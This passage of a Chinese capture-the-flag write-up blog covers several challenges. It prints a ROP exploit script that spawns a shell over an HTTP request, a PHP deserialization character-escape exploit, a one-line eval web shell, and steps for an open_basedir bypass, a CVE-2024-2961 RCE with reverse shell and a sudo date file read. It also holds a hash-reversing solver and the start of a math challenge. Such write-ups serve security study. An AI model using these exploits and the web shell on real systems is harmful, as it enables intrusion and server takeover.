class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak_info(<span class="string">&#x27;canary&#x27;</span>, canary)</span><br><span class="line"></span><br><span class="line">pop_5 = <span class="number">0x40a9d7</span></span><br><span class="line">pop_rdi = <span class="number">0x40296f</span></span><br><span class="line">pop_rsi = <span class="number">0x40a9de</span></span><br><span class="line">pop_rdx_2 = <span class="number">0x4a4c4b</span></span><br><span class="line">pop_rax = <span class="number">0x459227</span></span><br><span class="line">syscall = <span class="number">0x422fe6</span></span><br><span class="line">pop_rsp = <span class="number">0x402dce</span></span><br><span class="line">leave_ret = <span class="number">0x401b01</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">bss = <span class="number">0x4E8700</span></span><br><span class="line"></span><br><span class="line">chain = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0xdeadbeaf</span>)</span><br><span class="line">chain += p64(pop_5) + (<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x15</span> + <span class="string">b&#x27;/add\x00&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">chain += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">chain += p64(pop_rsi) + p64(bss)</span><br><span class="line">chain += p64(pop_rdx_2) + p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">chain += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">chain += p64(syscall)</span><br><span class="line">chain += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">chain += p64(pop_rdi) + p64(bss)</span><br><span class="line">chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">chain += p64(pop_rdx_2) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">chain += p64(syscall)</span><br><span class="line"></span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;POST /&#123;&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: www.baidu.com\r</span></span><br><span class="line"><span class="string">User-Agent: Haha\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">Content: &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">chain = chain</span><br><span class="line">payload = template.<span class="built_in">format</span>(<span class="string">&quot;add&quot;</span>, <span class="built_in">len</span>(chain)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload += chain + <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="b0okshelf"><a href="#b0okshelf" class="headerlink" title="b0okshelf"></a>b0okshelf</h2><p><strong>[题目writeup]：</strong></p>
<p><strong>发现备份文件</strong></p>
<p>通过 <code>robots.txt</code> 文件，我们发现了一个 <code>backup.zip</code> 文件。<code>robots.txt</code> 是一个用于告诉搜索引擎哪些页面不应被抓取的文件，但有时会泄露一些敏感信息。下载 <code>backup.zip</code> 后，我们可以获取源码。</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e41e2127ab.webp"></p>
<p><strong>分析源码</strong></p>
<p>源码显示项目使用了 PHP 的 <code>serialize</code> 来存储数据。<code>serialize</code> 函数将 PHP 变量转换为可存储或传输的字符串，但如果不安全地使用，可能会导致反序列化漏洞。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;books/&#x27;</span> . $book-&gt;<span class="built_in">id</span> . <span class="string">&#x27;.info&#x27;</span>, waf(serialize($book)));</span><br><span class="line">function waf($data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于对序列化后的内容进行过滤, 导致会存在字符增多的情况下的字符逃逸.</p>
<p>我们可以尝试逃逸掉 <code>Reader</code> 中的路径, 从而使其能够变成任意路径</p>
<h3 id="利用字符逃逸漏洞"><a href="#利用字符逃逸漏洞" class="headerlink" title="利用字符逃逸漏洞"></a><strong>利用字符逃逸漏洞</strong></h3><p>字符逃逸漏洞允许我们构造一个 payload 来覆盖路径，从而实现任意文件写入, 我们可以写入一句话木马。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span></span><br><span class="line">&#123;</span><br><span class="line">    public $<span class="built_in">id</span>;</span><br><span class="line">    public $title;</span><br><span class="line">    public $author;</span><br><span class="line">    public $summary;</span><br><span class="line">    public $reader;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reader</span></span><br><span class="line">&#123;</span><br><span class="line">    public function __construct($location)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;location = $location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getLocation()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;location;</span><br><span class="line">    &#125;</span><br><span class="line">    private $location;</span><br><span class="line">    public function getContent()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents($this-&gt;location);</span><br><span class="line">    &#125;</span><br><span class="line">    public function setContent($content)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($this-&gt;location, $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$book = new Book();</span><br><span class="line">$book-&gt;<span class="built_in">id</span> = <span class="string">&#x27;kengwang_aura&#x27;</span>;</span><br><span class="line">$book-&gt;title = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$book-&gt;author = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$partA = <span class="string">&#x27;&quot;;s:6:&quot;reader&quot;;O:6:&quot;Reader&quot;:1:&#123;s:16:&quot;&#x27;</span>;</span><br><span class="line">$partB = <span class="string">&#x27;Reader&#x27;</span>;</span><br><span class="line">$partC = <span class="string">&#x27;location&quot;;s:14:&quot;books/shel.php&quot;;&#125;&#125;;&#x27;</span>;</span><br><span class="line">$payload =  $partA . <span class="string">&quot;\x00&quot;</span> . $partB . <span class="string">&quot;\x00&quot;</span> . $partC;</span><br><span class="line">$length = strlen($partA) + strlen($partB) + strlen($partC) + <span class="number">2</span>;</span><br><span class="line">echo <span class="string">&quot;[+] Payload length: &quot;</span> . $length . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$book-&gt;summary = str_repeat(<span class="string">&#x27;\&#x27;&#x27;</span>, $length) . $payload;</span><br><span class="line">$book-&gt;reader = new Reader(<span class="string">&#x27;books/&#x27;</span> . <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">function waf($data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">&quot;[+] Summary: &quot;</span>;</span><br><span class="line">echo urlencode($book-&gt;summary);</span><br><span class="line">$res = waf(serialize($book));</span><br><span class="line">echo <span class="string">&quot;\n[+] Serialized payload: &quot;</span>;</span><br><span class="line">echo base64_encode($res);</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$newBook = unserialize($res);</span><br><span class="line">echo <span class="string">&quot;[+] Location: &quot;</span>;</span><br><span class="line">echo $newBook-&gt;reader-&gt;getLocation();</span><br></pre></td></tr></table></figure>

<p>注意这里的 private 其实我们可以不用封装到 <code>\x00</code> 里面的 (7.2+), 为了保险还是这么写了</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e45e7171e0.webp"></p>
<h3 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a><strong>写入一句话木马</strong></h3><p>在 <code>update.php</code> 中，我们发现了 <code>file_put_contents</code> 函数。<code>file_put_contents</code> 可以将数据写入文件，我们可以利用它来写入一句话木马。</p>
<p>我们访问 update.php 将内容改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="绕过安全限制"><a href="#绕过安全限制" class="headerlink" title="绕过安全限制"></a><strong>绕过安全限制</strong></h3><p>写入木马后，通过蚁剑连接发现存在 <code>disable_functions</code>，这是 PHP 的一个配置选项，用于禁用某些函数。通过 <code>phpinfo</code>，我们还发现存在 <code>open_basedir</code> 限制，<code>open_basedir</code> 用于限制 PHP 只能访问指定目录。</p>
<p>我们可以通过 <code>mkdir</code> 和 <code>chdir</code> 函数来绕过 <code>open_basedir</code> 限制。<code>mkdir</code> 创建目录，<code>chdir</code> 改变当前目录，通过这些操作，我们可以访问受限制的目录。详见 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10070#toc-12">https://xz.aliyun.com/t/10070#toc-12</a></p>
<p>对于 <code>disable_functions</code>，蚁剑的一键绕过 disabled_function 已全部无法使用，需要手动绕过。我们使用 CN-EXT (CVE-2024-2961) 来绕过限制并执行远程代码执行（RCE），最终反弹 shell。</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e460fdefea.webp"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h3><p>反弹 shell 后，为了提升交互性以便使用 sudo 提权，我们通过 <code>sudo -l</code> 发现 <code>date</code> 命令可以无密码执行。<code>sudo</code> 命令允许用户以超级用户权限执行命令，<code>sudo -l</code> 列出当前用户可以执行的命令。</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e4628c25e4.webp"></p>
<p>最后，通过 <code>sudo date -f /flag</code> 读取 flag。<code>date</code> 命令通常用于显示或设置系统日期和时间，但在这里我们利用它读取文件内容。</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e463f63fd8.webp"></p>
<h2 id="mygo"><a href="#mygo" class="headerlink" title="mygo"></a>mygo</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/mygo_42577da756ab5342e4562b8cf32eb2db.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>根据字符串定位到 sub_140001B70 为主函数</p>
<p>正常接收30位输入</p>
<p>调试可知 对输入进行了每位xor index，倒序,每位xor len-1-index,倒序</p>
<p>易知xor和xor抵消，倒序与倒序抵消，即相当于没有对输入做操作</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e47057f797.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e4717737a6.webp"></p>
<p>全局变量，先xor当前字节，再乘本身</p>
<p>全局变量，先xor当前字节的下一个字节，再乘本身</p>
<p>注意因为类型原因，乘以该大数后被截断</p>
<p>相当于一次处理两个字节</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e472c42377.webp"></p>
<p>比较enc和加密后的输入</p>
<p>同样是每两字节比较</p>
<p>注意比较顺序，导致需要倒序enc</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e474e5e31d.webp"></p>
<p>即该题目实现了一个hash算法，因为全局变量导致前后位相关，因为逻辑代码写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = string.printable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve2</span>(<span class="params"><span class="built_in">hash</span>, check</span>):</span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">input</span> = i1 + i2</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">myhash</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">                t1 = <span class="number">0x100000001B3</span></span><br><span class="line">                t2 = <span class="built_in">hash</span></span><br><span class="line">                <span class="keyword">for</span> byte <span class="keyword">in</span> s.encode():</span><br><span class="line">                    t2 ^= byte</span><br><span class="line">                    t2 = (t2 * t1) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;t2:016x&#125;</span>&quot;</span>, t2  <span class="comment"># 用0 padding到16位</span></span><br><span class="line"></span><br><span class="line">            res, HASH = myhash(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">if</span> res == check:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">input</span>, HASH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="string">&quot;08985807b541d18f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;d5f2d079088c0b17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2282110ea3670872&quot;</span>,</span><br><span class="line">    <span class="string">&quot;23826d0a97ceea45&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5feb92ec9da6ccc6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;418727fdc0a2295b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bf325bb7f6fb98b9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0669076ed7c9bfb3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;d905a4abf3eb7f22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5f5741aae1954e6c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8f70569021c638dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;e77f76949e5db63a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7f98a3f5e1b1e340&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9b7cd1e5a8dea236&quot;</span>,</span><br><span class="line">    <span class="string">&quot;d3c21142b990e7b8&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">hash</span> = <span class="number">0xCBF29CE484222325</span></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    res = solve2(<span class="built_in">hash</span>, c)</span><br><span class="line">    <span class="built_in">input</span> += res[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">hash</span> = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure>

<p>flag{BanGDream!ItsMyRust!!!!!}</p>
<h2 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/factor_742f32c65ffd18b766fa307f8de2d47d.zip" title="点击下载题文件"><span>点击下载题文件</span></a>



<p>设<svg xmlns="http://www.w3.org/2000/svg" width="7.501ex" height="2.398ex" viewBox="0 -890.8 3315.6 1060" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-39-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-39-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-39-TEX-N-33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path id="MJX-39-TEX-N-221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path><path id="MJX-39-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-39-TEX-I-1D44E"></use></g><g data-mml-node="mo" transform="translate(806.8, 0)"><use xlink:href="#MJX-39-TEX-N-3D"></use></g><g data-mml-node="mroot" transform="translate(1862.6, 0)"><g><g data-mml-node="mi" transform="translate(853, 0)"><use xlink:href="#MJX-39-TEX-I-1D45B"></use></g></g><g data-mml-node="mn" transform="translate(261.8, 391.8) scale(0.5)"><use xlink:href="#MJX-39-TEX-N-33"></use></g><g data-mml-node="mo" transform="translate(0, 30.8)"><use xlink:href="#MJX-39-TEX-N-221A"></use></g><rect width="600" height="60" x="853" y="770.8"></rect></g></g></g></svg>那么有<svg xmlns="http://www.w3.org/2000/svg" width="27.593ex" height="1.783ex" viewBox="0 -583 12196 788" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-55-TEX-I-1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path><path id="MJX-55-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-55-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-55-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-55-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-55-TEX-I-1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path><path id="MJX-55-TEX-I-1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-55-TEX-I-1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-55-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-55-TEX-I-1D45D"></use></g><g data-mml-node="mo" transform="translate(780.8, 0)"><use xlink:href="#MJX-55-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(1836.6, 0)"><use xlink:href="#MJX-55-TEX-I-1D44E"></use></g><g data-mml-node="mo" transform="translate(2587.8, 0)"><use xlink:href="#MJX-55-TEX-N-2B"></use></g><g data-mml-node="mi" transform="translate(3588, 0)"><use xlink:href="#MJX-55-TEX-I-1D465"></use></g><g data-mml-node="mi" transform="translate(4160, 0)"><use xlink:href="#MJX-55-TEX-I-1D45E"></use></g><g data-mml-node="mo" transform="translate(4897.8, 0)"><use xlink:href="#MJX-55-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(5953.6, 0)"><use xlink:href="#MJX-55-TEX-I-1D44E"></use></g><g data-mml-node="mo" transform="translate(6704.8, 0)"><use xlink:href="#MJX-55-TEX-N-2B"></use></g><g data-mml-node="mi" transform="translate(7705, 0)"><use xlink:href="#MJX-55-TEX-I-1D466"></use></g><g data-mml-node="mi" transform="translate(8195, 0)"><use xlink:href="#MJX-55-TEX-I-1D45F"></use></g><g data-mml-node="mo" transform="translate(8923.8, 0)"><use xlink:href="#MJX-55-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(9979.6, 0)"><use xlink:href="#MJX-55-TEX-I-1D44E"></use></g><g data-mml-node="mo" transform="translate(10730.8, 0)"><use xlink:href="#MJX-55-TEX-N-2B"></use></g><g data-mml-node="mi" transform="translate(11731, 0)"><use xlink:href="#MJX-55-TEX-I-1D467"></use></g></g></g></svg></p>
